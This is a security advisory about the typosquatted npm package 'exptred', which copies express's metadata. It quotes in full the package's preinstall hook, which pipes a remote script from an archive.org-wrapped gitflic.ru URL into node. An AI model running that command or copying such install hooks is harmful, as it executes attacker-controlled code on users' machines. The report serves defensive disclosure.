summary: Typosquat of express executes remote script from third-party host at install time
details: The npm package `exptred@5.2.2` is a typosquat of `express`: `package.json` copies express's author, contributors, repository (`expressjs/express`), homepage, keywords, and dependency list verbatim, and `index.js` is a one-liner re-exporting `./lib/express`. The `preinstall` lifecycle script runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`, piping remote JavaScript directly into `node` on the installer's host at `npm install` time. The destination is a non-publisher, unpinned, mutable URL (an archive.org wrapper around a gitflic.ru path under `hellscripter/install-scripts`), with no hash or signature verification, so arbitrary attacker-controlled code executes on the installer's machine on default install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
